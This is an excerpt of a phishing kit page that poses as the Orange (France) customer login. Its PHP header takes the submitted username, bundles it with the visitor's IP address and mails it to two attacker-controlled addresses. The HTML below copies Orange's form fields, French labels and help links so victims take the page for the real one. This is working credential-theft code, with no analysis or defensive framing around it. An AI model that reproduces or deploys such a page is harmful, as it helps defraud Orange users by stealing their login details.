...
if(isset($_POST['username'])){
    ...
    $success = mail($SEND_TO, "Username(2x) de $IP", $data);
    $success = mail($SEND_TO2, "Username(2x) de $IP", $data);
    sleep(5);
    ...
    <div class="o-container-fluid">
        <div class="row">
            <div class="col-xs-12 col-md-6 col-lg-6 col-xl-6 ">
                <div id="stage" class="">
                    <form novalidate class="eui-form" id="euiFor" action="" method="post">
                        <div id="eui-accounts">

                        </div>
                        <div class="form-group ">
                            <b class="sr-only" style="color: #f16e00;">Renseignez correctement votre identifiant</b>
                            <div class="eui-input-label">
                                <div class="eui-row">
                                    <label for="login" id="loginLabel" class="eui-label" style="color: #f12b2d;">Renseignez correctement votre compte</label>
                            ...
                            <input type="text" id="login" placeholder="Adresse mail ou n° de mobile Orange" name="username"
                                   class="form-control"
                    ...
                    <nav class="eui-links row" role="navigation">
                        ...
                        <div id="assistance" class="col-xs-12 col-md-12 col-lg-12 col-xl-12">
                            <a id="assistanceLink" href="/findLogin?return_url=https%3A%2F%2Fespace-client.orange.fr%2Fpage-accueil" rel="noopener noreferrer"
                        ...
                        <div id="firstAuthentBloc" class="col-xs-12 col-md-12 col-lg-12 col-xl-12">
                            <a id="firstAuthentLink" data-oevent="idme_login;clic_premiere_connexion;lien_premiere_connexion" href="/firstConnection?return_url=https%3A%2F%2Fespace-client.orange.fr%2Fpage-accueil" title="Vous vous identifiez pour la première fois  ?">Vous vous identifiez pour la première fois  ?</a>
                        </div>

                        <div id="firstAccessDiv" class="col-xs-12 col-md-12 col-lg-12 col-xl-12">
                            <a id="firstAccessLink" data-oevent="idme_login;clic_créer_compte;créer_votre_compte" href="https://r.orange.fr/r/Oid_signup?return_url=https%3A%2F%2Fespace-client.orange.fr%2Fpage-accueil"
                        ...
                        <div id="moreHelpLink" class="col-xs-12 col-md-12 col-lg-12 col-xl-12">
                            <a id="helpLink" data-oevent-category="idme_login" data-oevent-action="clic_aide" data-oevent-label="aide" href="/aide?return_url=https%3A%2F%2Fespace-client.orange.fr%2Fpage-accueil"
